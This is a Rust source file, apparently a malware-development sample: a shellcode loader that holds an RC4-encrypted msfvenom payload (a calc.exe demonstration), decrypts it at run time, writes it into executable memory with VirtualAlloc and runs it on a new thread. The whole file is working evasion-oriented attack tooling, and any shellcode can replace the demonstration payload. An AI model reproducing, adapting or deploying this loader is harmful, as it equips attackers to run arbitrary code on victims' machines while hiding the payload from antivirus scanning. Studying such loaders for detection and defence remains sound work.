use rc4::{Rc4, KeyInit, StreamCipher};
use windows::Win32::System::{
    Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
    Threading::{CreateThread, WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS},
};

fn main() {
    // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
    // Encrypted RC4
    let mut buf: [u8; 276] = [
        145, 3, 144, 190, 64, 219, 215, 244, 185, 133, 56, 168, 61, 89, 157, 138, 175, 87, 214,
        132, 4, 147, 251, 101, 135, 199, 210, 18, 58, 44, 91, 169, 37, 228, 167, 228, 4, 127, 81,
        204, 77, 75, 85, 236, 102, 100, 3, 77, 15, 44, 226, 163, 172, 24, 234, 61, 117, 189, 80,
        72, 91, 98, 111, 30, 12, 83, 13, 82, 103, 30, 7, 232, 231, 71, 7, 92, 165, 128, 88, 45,
        104, 56, 154, 203, 196, 95, 69, 248, 179, 125, 187, 129, 51, 163, 217, 40, 125, 254, 93,
        134, 197, 144, 108, 124, 22, 62, 122, 204, 187, 48, 69, 121, 212, 100, 173, 217, 53, 19,
        157, 248, 221, 67, 207, 169, 143, 67, 76, 130, 51, 158, 223, 164, 44, 234, 60, 48, 231,
        135, 80, 99, 26, 139, 181, 238, 206, 10, 48, 146, 202, 133, 79, 52, 120, 149, 131, 103, 29,
        250, 49, 86, 109, 213, 29, 224, 70, 61, 24, 124, 135, 118, 195, 138, 118, 65, 229, 244,
        138, 149, 97, 7, 185, 23, 53, 145, 159, 227, 177, 213, 14, 54, 130, 93, 224, 191, 144, 91,
        254, 163, 227, 19, 156, 82, 126, 143, 147, 153, 19, 34, 255, 254, 246, 253, 53, 217, 197,
        134, 103, 195, 238, 41, 223, 139, 1, 14, 230, 126, 1, 96, 226, 53, 5, 29, 171, 13, 160, 29,
        115, 253, 187, 63, 60, 192, 30, 86, 88, 8, 118, 151, 232, 83, 123, 133, 112, 35, 114, 224,
        5, 56, 203, 89, 155, 53, 213, 17, 180, 132, 230, 227, 172, 178, 153, 153, 222, 10, 213, 72,
    ];

    // Encrypted Methods
    // let mut rc4 = Rc4::new(b"SUPER_PASSWORD".into());
    // rc4.apply_keystream(&mut buf);

    // println!("{:?}", buf);

    let mut rc4 = Rc4::new(b"SUPER_PASSWORD".into());

    rc4.apply_keystream(&mut buf);

    unsafe {
        let address = VirtualAlloc(
            Some(std::ptr::null()),
            buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        std::ptr::copy(buf.as_ptr(), address as _, buf.len());

        let hthread = CreateThread(
            Some(std::ptr::null()),
            0,
            std::mem::transmute(address),
            None,
            THREAD_CREATION_FLAGS(0),
            None,
        )
        .unwrap();

        WaitForSingleObject(hthread, INFINITE);
    }
}
